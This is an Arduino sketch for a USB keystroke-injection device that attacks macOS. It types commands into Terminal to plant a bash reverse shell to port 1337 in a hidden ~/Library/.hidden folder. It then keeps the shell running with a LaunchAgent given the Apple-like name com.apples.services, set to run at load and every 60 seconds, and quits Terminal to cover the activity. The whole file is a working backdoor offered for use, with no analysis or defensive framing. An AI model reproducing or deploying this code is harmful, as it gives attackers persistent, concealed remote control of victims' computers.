/* Easy access to changing IP for netcat */
const String ipAddress = "localhost";

/* Helper Function */
void typeKey(int key) {
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

/* Init function */
void setup() {
  // Set up LED for blinking
  pinMode(LED_BUILTIN, OUTPUT);
  
  // Begining the Keyboard stream
  Keyboard.begin();

  // Wait 1.5 seconds
  delay(1500);

  // Press Command-Space to open Spotlight
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(KEY_SPACE);
  Keyboard.releaseAll();

  // Search for "terminal"
  Keyboard.print("terminal");

  // Wait 0.5 seconds
  delay(500);

  // Press enter
  typeKey(KEY_RETURN);

  // Wait 0.5 seconds
  delay(500);

  // Make new directory that will be hidden
  Keyboard.print("mkdir ~/Library/.hidden");

  // Press enter
  typeKey(KEY_RETURN);

  // Wait 0.2 seconds
  delay(200);

  // Creat and place bash script in the hidden folder
  Keyboard.print("echo '#!/bin/bash");
  typeKey(KEY_RETURN);
  Keyboard.print("bash -i >& /dev/tcp/" + ipAddress + "/1337 0>&1");
  typeKey(KEY_RETURN);
  Keyboard.print("wait' > ~/Library/.hidden/connect.sh");

  // Press enter
  typeKey(KEY_RETURN);

  // Wait 0.5 seconds
  delay(500);

  // Give script executable permissions
  Keyboard.print("chmod +x ~/Library/.hidden/connect.sh");

  // Press enter
  typeKey(KEY_RETURN);

  // Wait 0.2 seconds
  delay(200);

  // Make new directory for LaunchAgent
  Keyboard.print("mkdir ~/Library/LaunchAgents");

  // Press enter
  typeKey(KEY_RETURN);

  // Wait 0.2 seconds
  delay(200);

  // Create and place LaunchAgent plist in correct folder
  Keyboard.print("echo '<plist version=\"1.0\">");
  typeKey(KEY_RETURN);
  Keyboard.print("<dict>");
  typeKey(KEY_RETURN);
  Keyboard.print("<key>Label</key>");
  typeKey(KEY_RETURN);
  Keyboard.print("<string>com.apples.services</string>");
  typeKey(KEY_RETURN);
  Keyboard.print("<key>ProgramArguments</key>");
  typeKey(KEY_RETURN);
  Keyboard.print("<array>");
  typeKey(KEY_RETURN);
  Keyboard.print("<string>/bin/sh</string>");
  typeKey(KEY_RETURN);
  Keyboard.print("<string>'$HOME'/Library/.hidden/connect.sh</string>");
  typeKey(KEY_RETURN);
  Keyboard.print("</array>");
  typeKey(KEY_RETURN);
  Keyboard.print("<key>RunAtLoad</key>");
  typeKey(KEY_RETURN);
  Keyboard.print("<true/>");
  typeKey(KEY_RETURN);
  Keyboard.print("<key>StartInterval</key>");
  typeKey(KEY_RETURN);
  Keyboard.print("<integer>60</integer>");
  typeKey(KEY_RETURN);
  Keyboard.print("<key>AbandonProcessGroup</key>");
  typeKey(KEY_RETURN);
  Keyboard.print("<true/>");
  typeKey(KEY_RETURN);
  Keyboard.print("</dict>");
  typeKey(KEY_RETURN);
  Keyboard.print("</plist>' > ~/Library/LaunchAgents/com.apples.services.plist");

  // Press enter
  typeKey(KEY_RETURN);

  // Wait 0.2 secondss
  delay(200);

  // Give LaunchAgent correct permissions
  Keyboard.print("chmod 600 ~/Library/LaunchAgents/com.apples.services.plist");

  // Press enter
  typeKey(KEY_RETURN);

  // Wait 0.2 seconds
  delay(200);

  // Load the LaunchAgent
  Keyboard.print("launchctl load ~/Library/LaunchAgents/com.apples.services.plist");

  // Press enter
  typeKey(KEY_RETURN);

  // Wait 0.2 seconds
  delay(200);

  // Press Command-Q to quit application
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(KEY_Q);
  Keyboard.releaseAll();

  // Ending stream
  Keyboard.end();

  // Blink LED fast 10 times to signal completion
  for (int i = 0; i < 10; i++) {
    digitalWrite(LED_BUILTIN, HIGH);
    delay(100);
    digitalWrite(LED_BUILTIN, LOW);
    delay(100);
  }
}

/* Unused endless loop */
void loop() {}
